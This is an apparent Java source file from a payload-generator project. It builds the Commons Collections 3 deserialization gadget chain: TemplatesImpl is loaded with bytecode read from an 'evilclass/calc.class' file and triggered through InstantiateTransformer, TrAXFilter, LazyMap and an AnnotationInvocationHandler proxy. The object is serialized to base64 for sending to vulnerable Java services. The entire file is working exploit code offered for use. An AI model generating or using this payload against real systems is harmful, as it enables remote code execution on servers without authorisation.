package org.hasret.webserigen.payloads;
/**
 * 类描述
 *
 * @author Double
 * @version 1.0
 * @since 2025/4/1
 */
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.hasret.webserigen.utils.serial;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.IOException;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

//更换代码执行方法  templatesimpl + cc1 lazymap

public class CommonsCollections3 {
    public static String generatePayload(final String cmd) throws NoSuchMethodException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, TransformerConfigurationException, NoSuchFieldException {

        TemplatesImpl templates = new TemplatesImpl();
        Class c = templates.getClass();
        Field names = c.getDeclaredField("_name");
        names.setAccessible(true);
        names.set(templates,"aaaa");
        Field tfactory = c.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        byte[] code = Files.readAllBytes(Paths.get("src/main/java/org/hasret/webserigen/payloads/evilclass/calc.class"));
        byte[][] codes = {code};
        Field bytecodes = c.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

//        templates.newTransformer();
        //over 剩下的cc1 lazymap


        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        //instantiateTransformer.transform(TrAXFilter.class);
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };



        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> hashMap = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(hashMap,chainedTransformer);

        Class c2 = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationhdlConstrutor = c2.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationhdlConstrutor.setAccessible(true);
        InvocationHandler h = (InvocationHandler) annotationInvocationhdlConstrutor.newInstance(Override.class,lazyMap);

        Map mapProxy =(Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, h);

        Object o = annotationInvocationhdlConstrutor.newInstance(Override.class, mapProxy);

        String b64payload = serial.serializeBytesToB64(o);
        return b64payload;
    }

    public static void main(String[] args) throws IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, NoSuchFieldException, TransformerConfigurationException {
    }
}
